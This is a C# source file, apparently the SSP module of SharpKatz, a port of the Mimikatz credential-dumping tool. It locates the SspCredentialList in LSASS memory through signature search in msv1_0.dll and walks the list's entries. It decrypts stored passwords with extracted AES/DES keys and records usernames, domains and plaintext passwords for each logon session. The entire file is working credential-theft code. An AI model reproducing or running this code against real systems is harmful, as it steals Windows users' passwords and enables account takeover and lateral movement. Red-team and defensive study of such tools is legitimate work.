using SharpKatz.Credential;
using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace SharpKatz.Module
{
    class Ssp
    {

        static long max_search_size = 200000;

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_SSP_CREDENTIAL_LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public uint References;
            public uint CredentialReferences;
            public Natives.LUID LogonId;
            public uint unk0;
            public uint unk1;
            public uint unk2;
            public Msv1.KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
        };

        public static unsafe int FindCredentials(IntPtr hLsass, IntPtr msvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            KIWI_SSP_CREDENTIAL_LIST_ENTRY entry;
            long sspCredentialListSignOffset, sspCredentialListOffset;
            IntPtr sspCredentialListAddr;
            IntPtr msvLocal;
            IntPtr llCurrent;
            string passDecrypted = "";
            /*
            // Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
            msvLocal = Natives.LoadLibrary("msv1_0.dll");
            if (msvLocal == IntPtr.Zero)
            {
                Console.WriteLine("[x] Ssp Error: Could not load msv1_0.dll into local process");
                return 1;
            }
            //Console.WriteLine("[*] Ssp  Loaded msv1_0.dll at address {0:X}", msvLocal.ToInt64());

            byte[] tmpbytes = new byte[max_search_size];
            Marshal.Copy(msvLocal, tmpbytes, 0, (int)max_search_size);

            // Search for SspCredentialList signature within wdigest.dll and grab the offset
            sspCredentialListSignOffset = (long)Utility.SearchPattern(tmpbytes, oshelper.SspCredentialListSign);
            if (sspCredentialListSignOffset == 0)
            {
                Console.WriteLine("[x] Ssp  Error: Could not find SspCredentialList signature\n");
                return 1;
            }
            //Console.WriteLine("[*] Ssp  SspCredentialList offset found as {0}", sspCredentialListSignOffset);

            // Read memory offset to SspCredentialList from a "RAX,qword ptr [SspCredentialList]" asm
            IntPtr tmp_p = IntPtr.Add(msvMem, (int)sspCredentialListSignOffset + oshelper.CREDENTIALLISTOFFSET);
            byte[] sspCredentialListOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
            sspCredentialListOffset = BitConverter.ToInt32(sspCredentialListOffsetBytes, 0);

            // Read pointer at address to get the true memory location of SspCredentialList
            tmp_p = IntPtr.Add(msvMem, (int)sspCredentialListSignOffset + oshelper.CREDENTIALLISTOFFSET + sizeof(int) + (int)sspCredentialListOffset);
            byte[] sspCredentialListAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
            sspCredentialListAddr = new IntPtr(BitConverter.ToInt64(sspCredentialListAddrBytes, 0));
            */
            sspCredentialListAddr = Utility.GetListAdress(hLsass, msvMem, "msv1_0.dll", max_search_size, oshelper.CREDENTIALLISTOFFSET, oshelper.SspCredentialListSign);

            //Console.WriteLine("[*] Ssp  SspCredentialList found at address {0:X}", sspCredentialListAddr.ToInt64());

            llCurrent = sspCredentialListAddr;

            do
            {
                byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, llCurrent, Convert.ToUInt64(sizeof(KIWI_SSP_CREDENTIAL_LIST_ENTRY)));
                entry = Utility.ReadStruct<KIWI_SSP_CREDENTIAL_LIST_ENTRY>(entryBytes);

                string username = Utility.ExtractUnicodeStringString(hLsass, entry.credentials.UserName);
                string domain = Utility.ExtractUnicodeStringString(hLsass, entry.credentials.Domaine);
                int reference = (int)entry.References;

                byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, entry.credentials.Password.Buffer, (ulong)entry.credentials.Password.MaximumLength);

                byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, iv, aeskey, deskey);

                passDecrypted = Encoding.Unicode.GetString(msvDecryptedPasswordBytes);

                /*Console.WriteLine("LUID " + entry.LogonId.LowPart);
                 Console.WriteLine("References " + entry.References);
                 Console.WriteLine("CredentialReferences " + entry.CredentialReferences);
                 Console.WriteLine("Uusername {1} {0}", username, entry.credentials.UserName.MaximumLength);
                Console.WriteLine("Udomain {1} {0}", domain, entry.credentials.Domaine.MaximumLength);
                Console.WriteLine("Upassword {1} {0}", passDecrypted, entry.credentials.Password.MaximumLength);*/
                if (!string.IsNullOrEmpty(username) && username.Length > 1)
                {
                    Natives.LUID luid = entry.LogonId;

                    Credential.Ssp sspentry = new Credential.Ssp();
                    sspentry.Reference = reference;
                    if (!string.IsNullOrEmpty(username))
                    {
                        sspentry.UserName = username;
                    }
                    else
                    {
                        sspentry.UserName = "[NULL]";
                    }

                    if (!string.IsNullOrEmpty(domain))
                    {
                        sspentry.DomainName = domain;
                    }
                    else
                    {
                        sspentry.DomainName = "[NULL]";
                    }

                    // Check if password is present
                    if (!string.IsNullOrEmpty(passDecrypted))
                    {
                        sspentry.Password = passDecrypted;

                    }
                    else
                    {
                        sspentry.Password = "[NULL]";
                    }

                    Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                    if (currentlogon == null)
                    {
                        currentlogon = new Logon(luid);
                        currentlogon.UserName = username;
                        currentlogon.Ssp = new List<Credential.Ssp>();
                        currentlogon.Ssp.Add(sspentry);
                        logonlist.Add(currentlogon);
                    }
                    else
                    {
                        if (currentlogon.Ssp == null)
                            currentlogon.Ssp = new List<Credential.Ssp>();

                        currentlogon.Ssp.Add(sspentry);
                    }
                }

                llCurrent = entry.Flink;
            } while (llCurrent != sspCredentialListAddr);

            return 0;
        }
    }
}
